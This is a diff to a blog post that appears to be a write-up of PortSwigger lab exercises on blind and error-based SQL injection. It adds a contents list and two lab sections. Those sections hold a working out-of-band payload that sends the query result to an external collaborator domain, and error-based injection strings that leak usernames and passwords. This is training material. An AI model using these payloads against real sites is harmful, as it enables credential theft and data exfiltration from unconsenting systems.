@@ -14,21 +14,42 @@ image:
   height: 515
   alt: image alternative text
 ---
-# Basics
-I wouldn't now dive into what SQL injection is, as there are plenty of sources out there which explain that better then i ever could. Regarding Blind SQL Injections let's just mention that results of our SQL Injection do not cary any intormation or any errors. We just have to rely on how the web application behaves.
+# Intro
+Lab at portswigger: [Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)
 
-# Lab info
-As i am just going through  (Sep.2022) and i've just got to the [Blind SQL Injection part](https://portswigger.net/web-security/sql-injection/blind), i will use the Labs provided by Portswigger. I might add other Labs here in the future or may link CTF boxes or other labs in the future.
+# TOC
+- [Intro](#intro)
+- [TOC](#toc)
+- [Blind SQL injection with conditional responses](#blind-sql-injection-with-conditional-responses)
+  - [Intro](#intro-1)
+  - [Finding the SQL Injection](#finding-the-sql-injection)
+  - [Database Enumeration](#database-enumeration)
+    - [Does the `users` table exist](#does-the-users-table-exist)
+    - [Does the `Administrator` user exist](#does-the-administrator-user-exist)
+    - [Does the `administrator` exist](#does-the-administrator-exist)
+    - [How long is the `administrator`'s password (is it longer than 3 characters)](#how-long-is-the-administrators-password-is-it-longer-than-3-characters)
+    - [Does the first password letter start with `"a"`](#does-the-first-password-letter-start-with-a)
+    - [Can we ask for for next character in users password using ascii (numbers) instead?](#can-we-ask-for-for-next-character-in-users-password-using-ascii-numbers-instead)
+  - [Automatic Solution using Python](#automatic-solution-using-python)
+- [Blind SQL injection with conditional errors](#blind-sql-injection-with-conditional-errors)
+  - [Intro](#intro-2)
+  - [Problems arise - missing concatenation](#problems-arise---missing-concatenation)
+  - [Finding password with Burp Intruder - first character](#finding-password-with-burp-intruder---first-character)
+  - [Finding password with Burp Intruder - whole password](#finding-password-with-burp-intruder---whole-password)
+  - [Automating with Python](#automating-with-python)
+- [Blind SQL injection with Time delays](#blind-sql-injection-with-time-delays)
+  - [Finding Blind SQLi using Time delay](#finding-blind-sqli-using-time-delay)
+- [Blind SQL injection with time delays and information retrieval](#blind-sql-injection-with-time-delays-and-information-retrieval)
+  - [Intro](#intro-3)
+  - [Finding the SQL Injection](#finding-the-sql-injection-1)
+  - [Testing Yes/No Condition](#testing-yesno-condition)
+  - [Extracting password from `administrator`](#extracting-password-from-administrator)
+    - [Does `administrator` exist](#does-administrator-exist)
+    - [What is the first character of `administrator`'s password](#what-is-the-first-character-of-administrators-password)
+    - [Automation with Python](#automation-with-python)
+- [Blind SQL injection with out-of-band data exfiltration](#blind-sql-injection-with-out-of-band-data-exfiltration)
+- [Visible error-based SQL injection](#visible-error-based-sql-injection)
 
-In total we have 6 Labs available on the [Portswigger's Web Academy](https://portswigger.net/web-security/):
-- Blind SQL injection with conditional responses
-- Blind SQL injection with conditional errors
-- Blind SQL injection with time delays
-- Blind SQL injection with time delays and information retrieval
-- Blind SQL injection with out-of-band interaction (will be done at some point in future as Burp Collaborator is needed)
-- Blind SQL injection with out-of-band data exfiltration (will be done at some point in future as Burp Collaborator is needed)
-
-I'm really stoked to go through this labs and document as much relevant information about them as possible so let's get started.
 
 # Blind SQL injection with conditional responses
 >  This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
@@ -443,4 +464,59 @@ Password has been retrived
 
 Lab done:
 
-![picture 47](/assets/images/f7d2840be6c6cf0ba1594a12e8f8f85b4126f0f591f8cc84fad43a76f655059a.png)  
+![picture 47](/assets/images/f7d2840be6c6cf0ba1594a12e8f8f85b4126f0f591f8cc84fad43a76f655059a.png) 
+
+# Blind SQL injection with out-of-band data exfiltration
+
+> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie
+> 
+> The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain
+> 
+> The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+> 
+> To solve the lab, log in as the administrator user.
+
+First i should mention i had diffilculties finding the vulnerability by using SQLMap but had more luck with Burp's Scanner
+
+![picture 0](/assets/images/1f542cb624697cd0ab99bf852e82b49c573b9e2665a407c3e4089964bbc5a443.png)  
+
+This is query that Burp has used:
+
+```
+Cookie: TrackingId=g3cOtQeauj4CSC6p'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20rucxp%20SYSTEM%20%22http%3a%2f%2frpkzmgpymoyy6bk563eiduduslyem4a8y1lr9g.oasti'%7c%7c'fy.com%2f%22%3e%25rucxp%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c';
+```
+
+To solve the lab we need to exfiltrate `administrator`'s password. We can do it by exfiltrating data in the subdomain.
+
+![picture 1](/assets/images/6a6e7a845d2e34cd577a182fedebca7f281d15199b2321f82b7802656e91dc87.png)
+
+If the payload has worked, we should get an entry in the collaborator:
+
+![picture 3](/assets/images/2bf4bd6f7a183089677ea4ea78caa2f37afa121949c4d98bcbaa2f513ce938c2.png)  
+
+Lab has been solved:
+
+![picture 2](/assets/images/1bd921f1b0f2a345da4d8f28c393430f4942920d3dada0b44d31fda6c0f45279.png)  
+
+PS: PortSwiggers SQLi Cheatsheet: [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+
+# Visible error-based SQL injection
+> This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.
+> 
+> The database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, then log in to their account.
+
+In this lab, we get to see the error from the query, and if we read the description, it should be in the `trackingId` cookie.
+
+![picture 4](/assets/images/3f367f534be18cb057954eeab72d51251cc6df661345ca3cdd4908588c33a588.png)  
+
+We can fix the query with `EEioT3zzbZMmwTuQ'+OR+1=1+--`
+
+Let us keep in mind we are dealing with error based injection and we should exfiltrate infromation through the errors. 
+
+As there is truncation in place, following query will work:
+
+```sql
+' AND 2=CAST((SELECT username FROM users LIMIT+1) AS int)+--
+```
+
+We can retrieve the password from the same database, without using offset (luckily!).
